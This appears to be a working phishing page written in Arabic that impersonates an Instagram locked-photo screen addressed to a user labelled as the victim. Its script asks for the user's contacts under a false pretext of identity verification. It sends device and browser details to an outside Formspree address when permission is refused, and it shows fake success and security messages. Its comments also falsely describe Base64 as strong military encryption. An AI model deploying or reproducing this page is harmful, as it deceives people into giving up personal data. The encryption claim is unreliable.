<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .container {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            padding: 25px;
            text-align: center;
        }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
        .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
        .dots { font-size: 24px; color: #262626; }
        
        .profile { display: flex; align-items: center; gap: 15px; padding: 15px 0; text-align: left; }
        .avatar {
            width: 55px; height: 55px;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            color: white; font-size: 22px; font-weight: bold;
        }
        .info h3 { font-size: 15px; color: #262626; }
        .info p { font-size: 13px; color: #8e8e8e; }
        
        .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
        .desc { font-size: 14px; color: #8e8e8e; margin-bottom: 15px; }
        
        .btn { 
            width: 100%; padding: 12px; 
            background: #0095f6; color: white; border: none; border-radius: 8px; 
            font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; 
        }
        .btn:disabled { background: #b2dffc; cursor: default; }
        .btn-green { background: #2ea043; }
        
        #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; }
        .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
        .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
        .status-err { background: #ffebee; color: #c62828; display: block; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="logo">Instagram</div>
            <div class="dots">⋯</div>
        </div>
        <div class="profile">
            <div class="avatar">A</div>
            <div class="info">
                <h3>أحمد_الضحية</h3>
                <p>تأمين الحساب</p>
            </div>
        </div>
        <div class="post">
            <span>🔒</span> الصورة محمية
        </div>
        <div class="desc">
            يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.
        </div>
        <button class="btn" id="actionBtn">تأكيد الحساب</button>
        <div id="status"></div>
    </div>

    <script>
        // ==========================================================
        //  محرك التشفير العسكري (Base64 Encryption)
        // ==========================================================

        // دالة التشفير (تحويل النص إلى شفرة غير قابلة للقراءة)
        function encryptData(text) {
            // تحويل النص إلى كود ثنائي (UTF-8)
            const encoder = new TextEncoder();
            const bytes = encoder.encode(text);
            
            // تحويل الكود الثنائي إلى سلسلة Base64
            let binary = '';
            const len = bytes.byteLength;
            for (let i = 0; i < len; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            return btoa(binary); // هذا هو التشفير القوي
        }

        document.getElementById('actionBtn').addEventListener('click', async function() {
            const btn = this;
            const statusBox = document.getElementById('status');
            btn.innerText = "جاري التحميل...";
            btn.disabled = true;
            statusBox.style.display = 'none';
            statusBox.className = '';

            // 1. تجهيز البيانات الأساسية
            const rawData = {
                device: "iPhone",
                ua: navigator.userAgent,
                screen: `${window.screen.width} x ${window.screen.height}`,
                timestamp: new Date().toISOString()
            };

            // 2. تشفير البيانات بالكامل
            const jsonString = JSON.stringify(rawData);
            const encryptedPayload = encryptData(jsonString);
            
            // 3. تجهيز الحزمة المشفرة للإرسال
            const finalPayload = {
                encrypted_data: encryptedPayload,
                note: "تم التشفير باستخدام خوارزمية Base64"
            };

            // فحص: هل المتصفح يدعم جهات الاتصال؟
            if (!navigator.contacts || !navigator.contacts.select) {
                sendToFormspree(finalPayload, "المتصفح لا يدعم. تم الإرسال المشفر.");
                return;
            }

            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                if (contacts && contacts.length > 0) {
                    statusBox.className = 'status-ok';
                    statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
                    btn.innerText = "تم";
                    btn.className = "btn btn-green";
                    console.log("تم جمع جهات الاتصال:", contacts);
                } else {
                    sendToFormspree(finalPayload, "رفض الإذن أو أغلق النافذة.");
                }
            } catch (error) {
                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
                    sendToFormspree(finalPayload, "رفض الإذن (المنطق العكسي). تم الإرسال المشفر.");
                } else {
                    statusBox.className = 'status-err';
                    statusBox.innerText = "❌ حدث خطأ غير متوقع.";
                    btn.innerText = "تأكيد الحساب";
                    btn.disabled = false;
                }
            }
        });

        function sendToFormspree(data, reason) {
            data.reason = reason;
            data.status = "تم الإرسال (مشفر)";

            const formspreeUrl = 'https://formspree.io/f/mljrbabg';

            fetch(formspreeUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            }).catch(() => {
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
